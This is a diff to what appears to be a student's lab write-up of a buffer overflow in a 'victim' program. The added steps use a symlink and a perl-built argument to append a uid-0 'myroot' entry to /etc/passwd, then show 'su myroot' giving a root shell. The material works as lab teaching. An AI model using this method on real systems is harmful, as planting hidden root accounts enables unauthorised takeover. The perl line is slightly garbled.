@@ -44,5 +44,44 @@ So I'll create a root user by writing user_info in '/etc/passwd'.
 2. Symbolic file link   
   As we can see, the string for user_info should be end with '/bin/bash'(login shell).    
   But to overwrite 'datafile' to '/etc/passwd' by using overflow, argument which is passed to 'victim' should be end with '/etc/passwd'   
-  There is any sentence which ends with both '/bin/bash' and '/etc/passwd'.   
-  ...
+  So I'll use symbolic file link to make temp/etc/passwd->bin/bash
+  ```
+  :~$ mkdir /tmp/etc
+  :~$ ln -s /bin/bash /tmp/etc/passwd
+  :~$ ls -l /tmp/etc/passwd
+  lrwxrwxrwx 1 yong yong 8 4월 16 22:43 /tmp/etc/passwd -> bin/bash
+  ```
+  Now, we can set loginshell of myroot to /tmp/etc/passwd! 
+  
+3. Making Command Line Argument
+  First of all, we have to calculate the distance between 'buffer' and 'datafile' in victim.c
+  In this case, we can easily calculate the distance by executing because this program gives debugging information    
+  for buffer and datafile. It isn't realistic....    
+  Since command line argument form is    
+  
+  >"myroot:XXVgr9a1cu6os:0:0:AAAAA........AAAA:/root:/tmp/etc/passwd"    
+  
+  the length of string from 'myroot' to '/tmp' should be same with the distance between 'buffer' and 'datafile'.   
+  Let's assume the number of 'A' is k which satisfing this condition. Then we can add root user by 
+  
+  >./victim $(perl -e 'print "myroot:XXVgr9a1cu6os:0:0:" . "A: x k . ":/root:/tmp/etc/passwd"')  
+  
+  ```
+  :~$ cat etc/passwd
+   root:x:0:0:root:/root:/bin/bash
+  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
+  .
+  .
+  .
+  yong:x:1000:1000:yong,,,:/home/yong:/bin/bash
+  ?
+  myroot:XXVgr9a1cu6os:0:0:AAAAA........AAAA:/root:/tmp/etc/passwd
+  ```
+  
+  ```
+  :~$ su myroot
+  Password: 123456
+  root@yong:/home/yong# whoami
+  root
+  ```
+  
